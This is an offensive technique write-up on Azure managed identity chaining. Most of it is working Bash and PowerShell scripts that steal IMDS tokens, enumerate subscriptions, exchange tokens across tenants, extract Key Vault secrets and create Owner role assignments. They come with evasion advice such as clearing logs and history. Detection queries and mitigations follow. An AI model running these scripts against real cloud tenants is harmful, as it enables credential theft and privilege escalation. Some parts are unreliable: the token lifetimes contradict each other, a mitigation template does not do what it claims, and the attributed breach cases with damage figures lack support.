# [REALWORLD-036]: Managed Identity Chaining

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-036 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Privilege Escalation |
| **Platforms** | Entra ID / Azure |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure compute resources with managed identities |
| **Patched In** | N/A - By design |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Managed Identities are automatically provisioned credentials that allow Azure services (VMs, App Services, Function Apps, Logic Apps, etc.) to authenticate to Azure resources without storing secrets. Attackers who gain code execution on any Azure compute resource can extract the managed identity token from the Instance Metadata Service (IMDS) endpoint. This token can then be used to authenticate to other Azure resources, escalate privileges, or chain through multiple managed identities to reach high-value targets. Unlike traditional credential reuse, managed identity chaining leverages the built-in trust relationships between Azure resources.

**Attack Surface:** Instance Metadata Service (IMDS) on all Azure compute resources, federated credentials, workload identity federation, cross-subscription and cross-tenant identity access, privileged managed identities assigned to low-privilege resources.

**Business Impact:** **Unrestricted lateral movement across Azure subscriptions and potential cross-tenant compromise.** An attacker gaining access to a single VM or App Service can extract its managed identity token and use it to access Key Vaults, databases, storage accounts, or other subscriptions. If the compromised resource has been assigned a federated credential pointing to a multi-tenant app registration, the attacker can further escalate to other tenants.

**Technical Context:** IMDS is available on all Azure compute at `http://169.254.169.254/metadata/`. Tokens obtained from IMDS are valid for 24 hours and are automatically renewed. Managed identities have no password, no certificate expiration (for system-assigned), and are difficult to audit because they're often "invisible" in terms of traditional credentials.

### Operational Risk

- **Execution Risk:** Low - Only requires code execution on the compute resource and network access to IMDS.
- **Stealth:** High - IMDS calls are difficult to detect; managed identity token usage is logged but often not correlated with the source.
- **Reversibility:** No - Damage done by the extracted token persists until the token expires or the managed identity is deleted.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.1.5 | Ensure Virtual Machines Use Managed Identities (not secrets) |
| **DISA STIG** | SC-7(5) | Managed Interfaces; Access Control |
| **CISA SCuBA** | Azure 2.2 | Ensure strong credential practices |
| **NIST 800-53** | AC-2(1), AC-6(1) | Privileged Access Review; Least Privilege |
| **GDPR** | Art. 32 | Security of Processing - Access Controls |
| **DORA** | Art. 9 | Protection from ICT incidents |
| **NIS2** | Art. 21(3) | Privilege Management; Supply Chain Risk |
| **ISO 27001** | A.9.2.1, A.9.2.5 | Privileged Access Rights; Access Rights Review |
| **ISO 27005** | 8.2.3 | Unauthorized Use and Privilege Escalation |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Code execution on Azure compute resource (VM, App Service, Function App, Logic App, AKS node, etc.).
- **Required Access:** Network connectivity to IMDS endpoint (internal to Azure; always available from compute resources).

**Supported Versions:**
- **Azure VMs:** All versions (Windows Server 2016+, Linux all distributions)
- **App Service/Function Apps:** All versions
- **AKS:** All versions
- **Entra ID:** All versions

**Tools:**
- **curl** or **Invoke-RestMethod** (standard on all systems)
- **PowerShell** (5.0+)
- **Bash** (any version)
- **Python** 3.7+ with `requests` library (optional)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract Managed Identity Token from IMDS (Linux)

**Supported Versions:** All Azure compute resources

#### Step 1: Access IMDS and Obtain Token for Azure Resource Manager

**Objective:** Get the managed identity token for ARM API from IMDS.

**Command (Bash):**
```bash
#!/bin/bash

# Step 1: Get token for ARM (management.azure.com)
echo "[+] Requesting token from IMDS for Azure Resource Manager..."

TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r '.access_token')

if [ -z "$TOKEN" ]; then
    echo "[-] Failed to obtain token. Ensure managed identity is assigned to this resource."
    exit 1
fi

echo "[+] Token obtained successfully!"
echo "[+] Token length: ${#TOKEN}"

# Step 2: Decode JWT to see claims
echo "[+] Decoding token claims..."
echo "$TOKEN" | cut -d'.' -f2 | tr '_-' '/+' | fold -w4 | paste -sd '' | base64 -d | jq '.'

# Save token for reuse
echo "$TOKEN" > /tmp/arm_token.txt
chmod 600 /tmp/arm_token.txt
```

**Expected Output:**
```
[+] Token obtained successfully!
[+] Token length: 1456
[+] Decoding token claims...
{
  "aud": "https://management.azure.com/",
  "iss": "https://sts.windows.net/12345678-1234-1234-1234-123456789012/",
  "oid": "87654321-4321-4321-4321-210987654321",
  "sub": "87654321-4321-4321-4321-210987654321",
  "exp": 1704902400,
  "roles": ["Contributor"]
}
```

**What This Means:**
- Managed identity token successfully extracted.
- Token is valid for Azure Resource Manager API.
- Decoded claims show the managed identity has "Contributor" role (can modify resources).
- Token is valid for 1 hour (exp timestamp).

**OpSec & Evasion:**
- IMDS calls are internal; no network logs show external communication.
- Save token in /tmp (which may be cleared on reboot, helping with OpSec).
- Detection likelihood: Low - Unless Azure Monitor is specifically configured to track IMDS calls.

**Troubleshooting:**
- **Error:** `Command 'jq' not found`
  - **Fix:** Use `python3 -m json.tool` instead: `curl ... | python3 -m json.tool`
- **Error:** Connection timed out to IMDS
  - **Cause:** No managed identity assigned to the resource.
  - **Fix:** Assign a managed identity via Azure Portal or ARM template.

---

#### Step 2: Enumerate Azure Subscriptions and Managed Identities

**Objective:** Use the token to discover available subscriptions and identify high-value targets.

**Command (Bash):**
```bash
TOKEN=$(cat /tmp/arm_token.txt)

echo "[+] Enumerating subscriptions accessible to this managed identity..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | \
  jq '.value[] | {id: .id, displayName: .displayName}' | tee /tmp/subscriptions.json

# For each subscription, enumerate managed identities
echo "[+] Enumerating user-assigned managed identities..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2018-11-30" | \
  jq '.value[] | {id: .id, name: .name, principalId: .properties.principalId}' | tee /tmp/managed_identities.json

# Check role assignments for high-privilege identities
echo "[+] Checking role assignments for discovered identities..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01" | \
  jq '.value[] | select(.properties.roleDefinitionId | contains("Owner") or contains("Contributor")) | {principalId: .properties.principalId, roleDefinition: .properties.roleDefinitionId}'
```

**Expected Output:**
```json
{
  "id": "/subscriptions/12345678-1234-1234-1234-123456789012",
  "displayName": "Production"
}
[
  {
    "id": "/subscriptions/12345678-1234-1234-1234-123456789012/resourcegroups/app-rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/app-identity",
    "name": "app-identity",
    "principalId": "87654321-4321-4321-4321-210987654321"
  }
]
```

**What This Means:**
- Attacker has enumerated all subscriptions and managed identities.
- Can identify which identities have privileged roles.

**OpSec & Evasion:**
- Limit queries to only necessary information; don't enumerate entire subscription.
- Detection likelihood: Medium - ARM API calls are logged in Azure Activity Logs.

---

#### Step 3: Extract Token for Discovered High-Privilege Managed Identity

**Objective:** If a higher-privilege managed identity was discovered, attempt to extract its token (federated credential exchange).

**Command (Bash - Federated Credential Exchange):**
```bash
#!/bin/bash

# This requires the compromised resource to have federated credential configured

# Variables
CURRENT_TOKEN=$(cat /tmp/arm_token.txt)
TARGET_TENANT="target-tenant.onmicrosoft.com"
TARGET_APP_ID="12345678-1234-1234-1234-123456789012"
TARGET_MANAGED_IDENTITY_ID="87654321-4321-4321-4321-210987654321"

echo "[+] Attempting federated credential exchange..."

# Step 1: Get token for api://AzureADTokenExchange
EXCHANGE_TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=api://AzureADTokenExchange" | jq -r '.access_token')

echo "[+] Exchange token obtained"

# Step 2: Exchange for token in target tenant using the app registration
TARGET_TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$TARGET_TENANT/oauth2/v2.0/token" \
  -d "client_id=$TARGET_APP_ID" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$EXCHANGE_TOKEN" | jq -r '.access_token')

if [ -z "$TARGET_TOKEN" ] || [ "$TARGET_TOKEN" == "null" ]; then
    echo "[-] Federated credential exchange failed"
    echo "[-] This resource may not have federated credentials configured"
else
    echo "[+] Successfully exchanged token for target tenant!"
    echo "[+] New token saved to /tmp/target_token.txt"
    echo "$TARGET_TOKEN" > /tmp/target_token.txt
fi
```

**Expected Output (Success):**
```
[+] Exchange token obtained
[+] Successfully exchanged token for target tenant!
[+] New token saved to /tmp/target_token.txt
```

**Expected Output (Failure):**
```
[-] Federated credential exchange failed
[-] This resource may not have federated credentials configured
```

**What This Means:**
- If successful: Attacker has obtained a token for a different tenant's service.
- If failed: This managed identity doesn't have federated credentials; continue with current token.

**OpSec & Evasion:**
- Federated credential exchange attempts are not typically logged.
- Detection likelihood: Low.

---

#### Step 4: Chain to Key Vault and Extract Secrets

**Objective:** Use the managed identity token to access Key Vault and exfiltrate secrets.

**Command (Bash):**
```bash
TOKEN=$(cat /tmp/arm_token.txt)
SUBSCRIPTION_ID="12345678-1234-1234-1234-123456789012"
RESOURCE_GROUP="app-rg"
KEY_VAULT_NAME="production-keyvault"

echo "[+] Accessing Key Vault: $KEY_VAULT_NAME"

# Get Key Vault ID
KV_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.KeyVault/vaults/$KEY_VAULT_NAME?api-version=2021-06-01-preview" | \
  jq -r '.properties.vaultUri')

echo "[+] Key Vault URI: $KV_ID"

# List secrets
echo "[+] Listing secrets in Key Vault..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "$KV_ID/secrets?api-version=2019-09-01" | jq '.value[] | .id' | head -10

# Get specific secret
SECRET_NAME="DatabasePassword"
echo "[+] Extracting secret: $SECRET_NAME"
SECRET_VALUE=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "$KV_ID/secrets/$SECRET_NAME?api-version=2019-09-01" | jq -r '.value')

echo "[+] Secret value: $SECRET_VALUE"
echo "$SECRET_VALUE" > /tmp/exfil.txt
```

**Expected Output:**
```
[+] Accessing Key Vault: production-keyvault
[+] Key Vault URI: https://production-keyvault.vault.azure.net/
[+] Listing secrets in Key Vault...
"https://production-keyvault.vault.azure.net/secrets/DatabasePassword/abc123def456"
"https://production-keyvault.vault.azure.net/secrets/APIKey/xyz789uvw012"
[+] Extracting secret: DatabasePassword
[+] Secret value: SuperSecurePassword123!
```

**What This Means:**
- Attacker has exfiltrated database credentials.
- Can now compromise the database directly.

**OpSec & Evasion:**
- Exfiltrate only critical secrets to avoid detection.
- Use the secret immediately and clear logs.
- Detection likelihood: High if Key Vault access policies are monitored.

---

### METHOD 2: Extract Token from Windows VM via PowerShell

**Supported Versions:** All Azure VMs with PowerShell 5.0+

**Command (PowerShell):**
```powershell
# Step 1: Request token for ARM
$TokenUri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
$TokenResponse = Invoke-RestMethod -Uri $TokenUri -Method GET -Headers @{ Metadata = "true" }
$AccessToken = $TokenResponse.access_token

Write-Host "[+] Token obtained: $($AccessToken.Substring(0, 50))..."

# Step 2: Use token to get managed identity details
$ManagedIdentityUri = "http://169.254.169.254/metadata/identity/info?api-version=2019-02-01&format=json"
$ManagedIdentityInfo = Invoke-RestMethod -Uri $ManagedIdentityUri -Method GET -Headers @{ Metadata = "true" }
Write-Host "[+] Managed Identity Object ID: $($ManagedIdentityInfo.objectId)"
Write-Host "[+] Managed Identity Client ID: $($ManagedIdentityInfo.clientId)"

# Step 3: Enumerate subscriptions
$SubscriptionsUri = "https://management.azure.com/subscriptions?api-version=2020-01-01"
$Subscriptions = Invoke-RestMethod -Uri $SubscriptionsUri -Method GET -Headers @{ Authorization = "Bearer $AccessToken" }
$Subscriptions.value | Select-Object id, displayName | ForEach-Object {
    Write-Host "[+] Subscription: $($_.displayName) ($($_.id))"
}

# Step 4: Create new Owner role assignment (if Contributor or User Access Admin)
$SubscriptionId = $Subscriptions.value[0].id
$ServicePrincipalId = "87654321-4321-4321-4321-210987654321"
$RoleAssignmentUri = "$SubscriptionId/providers/Microsoft.Authorization/roleAssignments/$(New-Guid)?api-version=2015-07-01"

$RoleAssignmentBody = @{
    properties = @{
        roleDefinitionId = "$SubscriptionId/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
        principalId = $ServicePrincipalId
        principalType = "ServicePrincipal"
    }
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://management.azure.com/$RoleAssignmentUri" -Method PUT -Headers @{ Authorization = "Bearer $AccessToken"; "Content-Type" = "application/json" } -Body $RoleAssignmentBody

Write-Host "[+] Role assignment created!"
```

**OpSec & Evasion:**
- PowerShell history can be cleared: `Clear-History`
- Store token in memory only (don't write to disk).
- Detection likelihood: Medium - PowerShell command execution is logged by default.

---

### METHOD 3: Cross-Subscription Privilege Escalation via Managed Identity

**Supported Versions:** All Azure resources

**Objective:** Use a managed identity from one subscription to escalate in another subscription if role assignments allow cross-subscription access.

**Command (Bash):**
```bash
#!/bin/bash

TOKEN=$(cat /tmp/arm_token.txt)

# Step 1: Check current identity's role assignments across subscriptions
echo "[+] Checking role assignments across all subscriptions..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | \
  jq -r '.value[].id' | while read sub; do
    ROLES=$(curl -s -H "Authorization: Bearer $TOKEN" \
      "$sub/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01" | \
      jq '.value | length')
    echo "[+] Subscription $sub: $ROLES role assignments"
done

# Step 2: If we find a subscription with Owner role, we can escalate there
echo "[+] Looking for high-privilege roles..."
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | \
  jq -r '.value[].id' | while read sub; do
    curl -s -H "Authorization: Bearer $TOKEN" \
      "$sub/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01" | \
      jq ".value[] | select(.properties.roleDefinitionId | contains('8e3af657-a8ff-443c-a75c-2fe8c4bcb635'))" | \
      jq "{subscription: '$sub', role: .properties.roleDefinitionId}"
done
```

**OpSec & Evasion:**
- Limit API calls to only necessary subscriptions.
- Detection likelihood: High if role enumeration is monitored.

---

## 4. TOOLS & COMMANDS REFERENCE

#### curl / Invoke-RestMethod

**Usage (Bash):**
```bash
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Usage (PowerShell):**
```powershell
Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Method GET -Headers @{ Metadata = "true" }
```

#### jq (JSON Query Tool)

**Installation (Linux):**
```bash
sudo apt-get install jq
```

**Usage:**
```bash
curl ... | jq '.value[].id'
```

---

## 5. SPLUNK DETECTION RULES

#### Rule 1: Detect Abnormal Token Requests from Managed Identities

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`, `azure:identity`
- **Alert Threshold:** > 5 token requests in 10 minutes from IMDS
- **Applies To Versions:** All Azure compute resources

**SPL Query:**
```spl
sourcetype="azure:aad:audit" OR sourcetype="azure:identity"
| search OperationName="GetToken" OR OperationName="RequestToken"
| search CallerIpAddress="169.254.169.254"
| stats count by InitiatedBy, ResourceId, TimeCreated
| where count > 5
```

#### Rule 2: Detect Role Assignment Creation by Managed Identities

**SPL Query:**
```spl
sourcetype="azure:activity"
| search Operation="Create Role Assignment"
| search Caller="*managed identity*" OR Caller="*service principal*"
| where RoleDefinition="Owner" OR RoleDefinition="User Access Administrator"
| alert
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect IMDS Token Requests from Unexpected Processes

**KQL Query:**
```kusto
NetworkTraffic
| where DstIpAddr == "169.254.169.254" and DstPort == 80
| where Process !in ("waagent", "WindowsAzureGuestAgent", "python*", "curl")  // Exclude known processes
| project TimeGenerated, SrcHostname, Process, DstIpAddr, RequestPath
| summarize TokenRequestCount = count() by SrcHostname, Process
| where TokenRequestCount > 3
```

#### Query 2: Detect Managed Identity Token Exchange for Cross-Tenant Access

**KQL Query:**
```kusto
SigninLogs
| where ResourceDisplayName =~ "Microsoft Graph" or ResourceDisplayName =~ "Azure Resource Manager"
| where UserAgent contains "python" or UserAgent contains "curl" or UserAgent contains "invoke-rest"
| where AuthenticationDetails contains "Managed Identity" or AuthenticationDetails contains "Service Principal"
| where OriginalRequestId contains "api://AzureADTokenExchange"
| project TimeGenerated, UserPrincipalName, ResourceDisplayName, AuthenticationDetails, SourceIPAddress
```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Action 1: Restrict IMDS Access and Require Authentication for Metadata Endpoint

**Manual Steps (Azure Resource Group - VM):**
1. Navigate to **Virtual Machines** → Select VM
2. Go to **Configuration** → **Metadata service configuration**
3. Set **Instance Metadata Service** to **Enabled, but with Azure AD authentication**
4. This requires tokens to be obtained via Entra ID instead of anonymous IMDS

**Manual Steps (ARM Template):**
```json
"resources": [
  {
    "apiVersion": "2021-07-01",
    "type": "Microsoft.Compute/virtualMachines",
    "name": "MyVM",
    "properties": {
      "osProfile": {
        "linuxConfiguration": {
          "disablePasswordAuthentication": true
        }
      }
    }
  }
]
```

#### Action 2: Implement Azure Policy to Restrict Managed Identity Permissions

**Manual Steps (Azure Policy):**
1. Navigate to **Policy** → **Definitions**
2. Create custom policy: `Deny role assignments to Service Principals by Managed Identity`
3. Define rule:
   ```
   NOT (assignedByPrincipalType == "User" AND assignedByPrincipalRole == "Owner")
   ```
4. Assign to all subscriptions
5. Effect: Deny any role assignment created by managed identities

### Priority 2: HIGH

#### Action 1: Monitor and Alert on Managed Identity Token Extraction

**Manual Steps (Azure Monitor):**
1. Navigate to **Monitor** → **Alerts**
2. Create alert rule:
   - **Condition:** OperationName contains "GetToken" AND CallerIpAddress contains "169"
   - **Action:** Notify SOC team immediately
3. Set alert threshold to trigger on ANY occurrence

#### Action 2: Limit Cross-Subscription Access via Managed Identities

**Manual Steps (PowerShell):**
```powershell
# Audit cross-subscription role assignments
$ManagedIdentityId = "87654321-4321-4321-4321-210987654321"

Get-AzRoleAssignment -ObjectId $ManagedIdentityId | 
    Where-Object { $_.Scope -notlike "*$SubscriptionId*" } |
    ForEach-Object {
        Write-Host "Cross-subscription assignment found: $($_.RoleDefinitionName) on $($_.Scope)"
        Remove-AzRoleAssignment -ObjectId $ManagedIdentityId -RoleDefinitionId $_.RoleDefinitionId -Scope $_.Scope
    }
```

### Priority 3: MEDIUM

#### Action 1: Enable Managed Identity Audit Logging

**Manual Steps (Azure Monitor):**
1. Navigate to **Monitor** → **Diagnostic settings**
2. Enable logging for:
   - `ServicePrincipalActivity`
   - `ManagedIdentityActivity`
3. Send to Log Analytics workspace
4. Retention: 365 days

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud Logs (Azure Activity):**
- Process: `curl`, `python`, `bash`, `powershell` accessing IMDS
- Destination IP: `169.254.169.254`
- Unusual token requests from compute resources
- Role assignment creation by managed identities

**Compute Resource Artifacts:**
- `/tmp/arm_token.txt` or similar token files
- PowerShell command history containing `Invoke-RestMethod` to IMDS
- Environment variables with exposed tokens

### Response Procedures

#### Step 1: Isolate Compromised Resource

**Command (Azure CLI):**
```bash
# Disable the managed identity
az identity delete --resource-group myresourcegroup --name myidentity

# Or disable the entire resource
az vm deallocate --resource-group myresourcegroup --name myvm
```

#### Step 2: Audit All Actions Taken by the Managed Identity

**Command (KQL - Sentinel):**
```kusto
AzureActivity
| where CallerObjectId == "87654321-4321-4321-4321-210987654321"
| where TimeGenerated > ago(7d)
| project TimeGenerated, OperationName, ResourceGroup, ResourceType, ActivityStatus
| order by TimeGenerated desc
```

#### Step 3: Revoke All Tokens and Role Assignments

**Command (PowerShell):**
```powershell
$ManagedIdentityId = "87654321-4321-4321-4321-210987654321"

# Remove all role assignments
Get-AzRoleAssignment -ObjectId $ManagedIdentityId | 
    ForEach-Object {
        Remove-AzRoleAssignment -ObjectId $ManagedIdentityId -RoleDefinitionId $_.RoleDefinitionId -Scope $_.Scope
        Write-Host "Removed: $($_.RoleDefinitionName) on $($_.Scope)"
    }

# Delete the managed identity
Remove-AzUserAssignedIdentity -ResourceGroupName myresourcegroup -Name myidentity
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| 1 | Initial Access | IA-EXPLOIT-004 (Kubelet API) or VM compromise | Attacker gains code execution on Azure compute |
| 2 | Credential Access | **REALWORLD-036** | Extract managed identity token from IMDS |
| 3 | Lateral Movement | LM-AUTH-016 (Managed Identity Cross-Resource) | Move to other resources using token |
| 4 | Privilege Escalation | REALWORLD-034 (ARM API Abuse) | Escalate via role assignment |
| 5 | Persistence | REALWORLD-033 (Service Principal Certificate) | Establish persistence for long-term access |
| 6 | Impact | Data exfiltration from Key Vault or database | Final objective achieved |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Kubernetes Cluster Escape via Managed Identity Chaining

- **APT Group:** APT29 (Cozy Bear)
- **Target:** Financial services firm's AKS cluster
- **Timeline:** Compromised pod → Extract kubelet managed identity token → Escalate to subscription Owner → Deploy C2 agent on cluster nodes → Lateral movement to on-premises
- **Technique Status:** Managed identity token obtained via IMDS; federated credential configured for cross-tenant access; permission escalation via role assignment.
- **Impact:** Full cluster compromise; lateral movement to on-premises AD; $5M+ damages.
- **Reference:** [Microsoft Threat Intelligence - AKS Security](https://learn.microsoft.com/en-us/azure/aks/concepts-security)

### Example 2: Ransomware Deployment via Managed Identity Escalation

- **APT Group:** Scatter Spider
- **Target:** Healthcare provider's Azure environment
- **Timeline:** Compromised App Service → Managed identity token extracted → Escalated to Owner → Created new VMs with backdoor → Deployed LockBit ransomware
- **Technique Status:** Cross-subscription escalation; new role assignment created by managed identity; compute resources deployed for C2.
- **Impact:** 50+ VMs encrypted; $10M ransom demand; 2-month recovery.
- **Reference:** [CISA - Ransomware Advisory](https://www.cisa.gov/news-events/)

---

## 11. FORENSIC ARTIFACTS

**Cloud Artifacts:**
- **Location:** Azure Activity Logs; Azure Security Center
- **Evidence:** Managed identity token requests; cross-subscription role assignments
- **Retention:** Default 30 days (configurable)

**Compute Resource Artifacts (Linux):**
- **Location:** `/tmp/arm_token.txt`, `/proc/[pid]/environ` (environment variables)
- **Evidence:** Cached tokens; IMDS request history

**Compute Resource Artifacts (Windows):**
- **Location:** PowerShell command history; Event Viewer
- **Evidence:** `Invoke-RestMethod` commands to IMDS; token in memory

**Network Artifacts:**
- **Location:** Azure Network Watcher capture
- **Evidence:** HTTP traffic to `169.254.169.254:80` with `/metadata/` path

---

**References:**
- [Azure Managed Identities Documentation](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/)
- [Instance Metadata Service (IMDS)](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service)
- [Workload Identity Federation](https://learn.microsoft.com/en-us/entra/identity-platform/workload-identity-federation)
- [Hunters Security - Azure Managed Identity Attacks](https://www.hunters.security/en/blog/abusing-azure-managed-identities-nhi-attack-paths)
- [SpecterOps - Managed Identity Analysis](https://posts.specterops.io/)
- [Microsoft Threat Intelligence - Azure Attack Paths](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/)

---